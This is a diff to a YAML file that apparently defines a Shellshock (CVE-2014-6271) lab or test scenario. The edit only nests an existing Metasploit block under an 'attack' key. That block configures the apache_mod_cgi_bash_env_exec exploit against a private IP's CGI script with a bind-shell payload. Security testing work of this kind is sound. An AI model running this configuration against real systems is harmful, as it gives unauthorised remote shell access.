@@ -2,13 +2,14 @@ vulnerability:
   cve: CVE-2014-6271
   attack_vector: remote
 
-metasploit:
-  - module_type: exploit
-    module_name: exploit/multi/http/apache_mod_cgi_bash_env_exec
-    options:
-      - name: RHOST
-        value: 192.168.177.177
-      - name: TARGETURI
-        value: http://192.168.177.177/cgi-bin/test.cgi
-      - name: PAYLOAD
-        value: linux/x86/shell_bind_tcp
+attack:
+  metasploit:
+    - module_type: exploit
+      module_name: exploit/multi/http/apache_mod_cgi_bash_env_exec
+      options:
+        - name: RHOST
+          value: 192.168.177.177
+        - name: TARGETURI
+          value: http://192.168.177.177/cgi-bin/test.cgi
+        - name: PAYLOAD
+          value: linux/x86/shell_bind_tcp
